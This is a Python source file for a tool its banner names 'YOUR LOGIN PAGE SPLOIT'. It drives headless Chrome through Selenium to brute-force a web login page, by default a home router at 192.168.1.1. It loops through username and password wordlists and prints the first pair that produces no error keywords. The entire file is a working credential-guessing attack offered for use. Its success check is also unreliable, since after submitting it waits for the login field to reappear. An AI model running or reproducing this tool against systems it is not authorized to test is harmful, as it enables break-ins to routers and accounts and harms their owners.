# chmod +x /PATH-TO/selenium/webdriver/common/linux/selenium-manager

import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ANSI Colors
YELLOW = "\033[93m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RESET = "\033[0m"

print("""__        _______ ____
\ \      / /  ___/ ___| YOUR
 \ \ /\ / /| |_  \___ \ LOGIN
  \ V  V / |  _|  ___) |PAGE
   \_/\_/  |_|   |____/ SPLOIT""")

def colored_print(text, color):
    return f"{color}{text}{RESET}"

def get_user_input(default, prompt, color):
    user_input = input(colored_print(prompt, color))
    if not user_input:
        return default
    return user_input

def main():
    usage = input("Show URL usage? y/n: ")
    if usage.lower() == "y":
        print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
        print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
        print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
        print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
    else:
        pass
    url = get_user_input('http://192.168.1.1', "Router's ip (default: http://192.168.1.1) : ", RESET)
    print("\r")

    # Use Unicode strings directly
    expression = {"error", "incorrect", "failure", "try", "again", "invalid", "invalida", "erro", "outdated", "incorreto", "inválida"}  # You can add your own login page errors messages here

    u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
    username_element_type = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)

    p_word = get_user_input("password", "Password html element name (default: password): ", BLUE)
    password_element_type = get_user_input("i", "Is password element an id or a name? (i/n): ", BLUE)

    button = get_user_input("button", "Button html element name (default: button): ", GREEN)
    button_element_type = get_user_input("i", "Is button element an id or a name? (i/n): ", GREEN)

    if username_element_type == "i":
        username_element_type = By.ID
    elif username_element_type == "n":
        username_element_type = By.NAME

    if password_element_type == "i":
        password_element_type = By.ID
    elif password_element_type == "n":
        password_element_type = By.NAME

    if button_element_type == "i":
        button_element_type = By.ID
    elif button_element_type == "n":
        button_element_type = By.NAME

    # Setup Chrome options
    options = Options()
    options.headless = True

    # Specify path to chromedriver if not in PATH
    service = Service('/usr/local/bin/chromedriver')

    # Start Chrome WebDriver
    driver = webdriver.Chrome(service=service, options=options)
    print(colored_print("\rChrome WebDriver started successfully", YELLOW))

    combinations_tested = 0

    while True:
        usernames_file = input("Usernames file location (default: username.txt): ")
        if not usernames_file:
            usernames_file = "username.txt"
        passwords_file = input("Passwords file location (default: password.txt): ")
        if not passwords_file:
            passwords_file = "password.txt"

        try:
            with open(usernames_file, "r") as user_file:
                usernames = [u.strip() for u in user_file.readlines()]
            with open(passwords_file, "r") as pass_file:
                passwords = [p.strip() for p in pass_file.readlines()]
            break
        except FileNotFoundError:
            print("One or both files not found. Please provide valid file locations.")
        except PermissionError:
            print("Permission denied. Please check file permissions and try again.")
        except Exception as e:
            print(f"An error occurred while loading files: {e}")

    total_combinations = len(usernames) * len(passwords)

    try:
        for username in usernames:
            for password in passwords:
                combinations_tested += 1
                sys.stdout.write("\nCombinations tested: %d/%d" % (combinations_tested, total_combinations))
                sys.stdout.flush()
                brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")
    finally:
        driver.quit()

def brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button):
    try:
        driver.get(url)
        print(colored_print("\nPage loaded successfully", GREEN))

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((username_element_type, u_name)))
        print(colored_print("Page loaded and username input field is present", YELLOW))

        username_input = driver.find_element(username_element_type, u_name)
        password_input = driver.find_element(password_element_type, p_word)

        username_input.clear()
        username_input.send_keys(username)
        password_input.clear()
        password_input.send_keys(password)

        try:
            submit_button = driver.find_element(button_element_type, button)
            submit_button.click()
            print(colored_print("Form submission successful", GREEN))
        except Exception as e:
            print("Error clicking submit button:", e)
            return

        # Add a delay to ensure the page has time to load after form submission
        time.sleep(5)  # Adjust the sleep time as needed

        # Wait for a new element that indicates login success or redirection
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((username_element_type, u_name)))

        # Obtain the page source after the login attempt
        driver_lower_content = driver.page_source.lower()

        # Check if any of the error messages are present in the page source
        if not any(item in driver_lower_content for item in expression):
            print("\nBrute Forcing...")
            print("[+] Username: ", username)
            print("[+] Password: ", password)
            print("Server Response:", driver_lower_content)
            sys.exit()
        else:
            print("Success condition not met")
            print(driver_lower_content)
    except Exception as e:
        print("Error using Selenium:", e)
        sys.exit(1)

if __name__ == '__main__':
    main()
